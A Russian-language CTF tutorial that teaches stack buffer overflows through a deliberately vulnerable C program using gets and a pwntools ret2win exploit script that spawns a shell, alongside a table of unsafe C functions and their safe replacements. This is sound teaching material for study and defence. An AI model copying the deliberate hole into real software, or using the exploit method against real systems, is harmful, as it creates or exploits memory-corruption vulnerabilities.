## Вопрос, с которого всё начинается

В CTF-категории pwn тебе дают файл `challenge`. Запускаешь — он спрашивает имя, отвечает «привет» и завершается. Ничего подозрительного. Где тут уязвимость? И как вообще заставить чужую программу выполнить то, что нужно тебе?

Начинается всё с самой частой и самой понятной дырки — переполнения буфера на стеке. Разберём её на одной крошечной программе от начала до конца.

## Наш пример: программа с «подарком»

Возьмём такую программу:

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>

void win(void) {
    system("/bin/sh");   // вот это мы и хотим выполнить
}

int main(void) {
    char buf[64];        // буфер ровно на 64 байта
    gets(buf);           // читает ввод, НЕ проверяя длину
    puts(buf);
    return 0;
}
```

Здесь есть функция `win`, которая открывает shell, но `main` её никогда не вызывает. Задача: заставить программу всё-таки прыгнуть в `win`. Такая задача называется **ret2win** — «возврат в win».

Скомпилируем и посмотрим, что получилось.

```bash
$ gcc -fno-stack-protector -no-pie -o vuln vuln.c
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
      dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
      for GNU/Linux 3.2.0, not stripped
```

Что такое ELF и как он запускается, мы разобрали в прошлом уроке (`pwn-elf-basics`). Здесь важен только флаг компиляции `-fno-stack-protector`: он отключает защиту, которая мешала бы нам на первом шаге. Что именно он отключает — узнаем чуть позже.

## Шаг 1. Где в памяти лежит ввод

Когда функция `main` начинает работать, компилятор выделяет под её локальные переменные область в **стеке** — это участок памяти, куда складываются данные функций. Наш массив `buf[64]` лежит там.

Сразу за `buf` в стеке лежит **сохранённый адрес возврата** — адрес, куда процессор прыгнет, когда `main` закончит. Именно по нему программа «возвращается» обратно в код, который её вызвал.

Функция `gets` пишет во `buf` до первого перевода строки и **не смотрит на размер буфера**. Значит, если дать ей больше 64 байт, лишнее «перельётся» дальше по стеку — и в конце концов затрёт сохранённый адрес возврата. Это и есть **переполнение буфера**: данные выходят за границу массива и портят соседнюю память.

## Шаг 2. Ломаем программу специально

Проверим, что мы правы: скормим программе 100 символов `A` и посмотрим, куда она упадёт.

```bash
$ python3 -c "print('A'*100)" | ./vuln
Segmentation fault (core dumped)
```

Программа упала с **SIGSEGV** — сигналом о том, что она обратилась по недопустимому адресу. Логично: мы замазали адрес возврата байтами `0x41` («A»), и при возврате процессор прыгнул на `0x4141414141414141` — такой памяти нет.

Откроем краш под отладчиком GDB и посмотрим, что в регистре `rip` — это регистр с адресом следующей инструкции. Если он равен нашим `A`, значит мы контролируем возврат.

```bash
$ gdb -q ./vuln
(gdb) run < <(python3 -c "print('A'*100)")
Program received signal SIGSEGV
(gdb) info registers rip
rip            0x4141414141414141       # 0x41 = 'A'
```

Отлично — мы управляем тем, куда вернётся программа. Осталось понять, на каком именно байте заканчивается буфер, чтобы поставить туда нужный адрес.

## Шаг 3. Находим точное смещение

На глаз это не угадать: между буфером и адресом возврата может быть выравнивающий «padding». Придумали трюк: подать строку, в которой каждая 8-байтовая группа уникальна. Такую строку называют **cyclic-паттерном** (паттерн де Брёйна).

В библиотеке `pwntools` есть функция `cyclic(n)`:

```bash
$ python3 -c "from pwn import *; print(cyclic(200))"
aaaabaaacaaadaaaeaaafaaagaaaha...
```

Подаём этот паттерн программе, смотрим `rip` в GDB:

```bash
(gdb) run < pattern.txt
Program received signal SIGSEGV
(gdb) info registers rip
rip            0x6161616b6161616a
```

Четыре байта `0x6161616b6161616a` — это кусок нашего паттерна. Теперь `cyclic_find` скажет, с какой позиции он начинается:

```python
>>> from pwn import *
>>> cyclic_find(0x6161616b6161616a)
72
```

**Смещение — 72 байта.** Логика простая: 64 байта буфера + 8 байт сохранённого указателя базы (`rbp`) = 72. Значит, первые 72 байта заполняем чем угодно, а следующие 8 — это новый адрес возврата.

## Шаг 4. Первый эксплойт: ret2win

Узнаем адрес функции `win`. Проще всего спросить у pwntools, он сам разберёт символы бинаря:

```python
>>> from pwn import *
>>> elf = ELF('./vuln')
>>> hex(elf.symbols['win'])
'0x4011a6'
```

Собираем эксплойт: 72 байта мусора + адрес `win`, упакованный в 8 байт little-endian функцией `p64`.

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
OFFSET = 72
win = elf.symbols['win']

p = process('./vuln')
p.sendline(b'A' * OFFSET + p64(win))
p.interactive()
```

```bash
$ python3 exp.py
[*] '/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Мы получили shell — команда `id` выполнилась. Первый эксплойт готов.

## Шаг 5. Если падает внутри libc — проверь выравнивание

Иногда адрес `win` верный, а программа всё равно падает — уже **внутри** библиотеки libc, на инструкции `movaps`. Это SSE-инструкция, которая требует, чтобы стек был выровнен на 16 байт. После нашего прыжка выравнивание сбилось.

Лечится вставкой лишнего «пустого возврата» — адреса любой инструкции `ret` — перед `win`. Один `ret` сдвинет стек на 8 байт и восстановит выравнивание:

```python
ret = ROP(elf).find_gadget(['ret']).address
payload = b'A' * OFFSET + p64(ret) + p64(win)
```

Правило: **если при заведомо верном адресе падает в libc на `movaps` — добавь `ret`**.

## Какие функции опасны

Переполнение возникает не само по себе — его создаёт небезопасная функция. Вот частые виновники и их безопасные замены:

| Опасная функция | Проблема | Безопасная замена |
|---|---|---|
| `gets` | не знает про размер буфера вообще | `fgets` |
| `strcpy` / `strcat` | копируют до `\x00` | `strncpy` / `strlcat` |
| `sprintf` | нет границы формата | `snprintf` |
| `scanf("%s")` | нет ширины поля | `scanf("%63s")` |
| `read` без проверки | читает заданное число байт | проверять `n` перед вызовом |
| `memcpy` с user-длиной | переполнение | ограничивать длину |

Почему это важно: какая именно функция переполняет, определяет **ограничения payload**. `gets` и `strcpy` останавливаются на `\x00` и `\n`, поэтому адрес с нулевыми байтами через них не запишешь. `read` читает ровно сколько сказано и позволяет писать нули — это критично для адресов PIE.

## Инструмент: nm — таблица символов

`nm` перечисляет символы бинарника: имена функций и глобальных переменных с их адресами. Если символы не срезаны, это самый быстрый способ найти нужную функцию.

Ключи, которые пригодятся:
* `nm <файл>` — все символы с адресами;
* `nm -C <файл>` — демутируй C++-имена (читаемые сигнатуры);
* `T`/`t` — код (глобальный/локальный), `R`/`r` — только чтение (`.rodata`), `D`/`B` — данные;
* нижний регистр = локальный символ, верхний = глобальный/экспортируемый.

## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

## Что мы теперь знаем

- Переполнение буфера — это запись данных за границу массива; лишние байты портят соседнюю память.
- Сразу за буфером на стеке лежит сохранённый адрес возврата — управляя им, мы управляем исполнением.
- Точное смещение до возврата находят cyclic-паттерном, а не на глаз.
- Эксплойт ret2win: `мусор + p64(адрес_win)`.
- Падение в libc на `movaps` лечится лишним `ret`.

## Куда дальше

Мы получили shell руками, но писали адреса и смещение «в лоб». В следующем уроке возьмём этот же бинарь `vuln` и соберём тот же эксплойт через `pwntools` — аккуратно, с автоматическим разбором символов, поиском паттерна и подключением к удалённому сервису. Запомни главное: **переполнение даёт нам контроль над адресом возврата, а cyclic_find — точку, куда этот адрес положить.**

## Где пригодится

- **CTF Pwn:** ret2win без защит — самая частая «первая кровь» в задачах категории pwn.
- **Аудит C/C++ кода:** небезопасные `gets`, `strcpy`, `sprintf`, `scanf("%s")` и `read` без проверки длины — прямой путь к отчёту об уязвимости.
- **Bug bounty:** крэш нативных компонентов (парсеры протоколов, плагины) часто начинается именно со stack overflow.
- **Работа:** понимание порчи памяти — база для secure coding и анализа CVE в системном ПО.
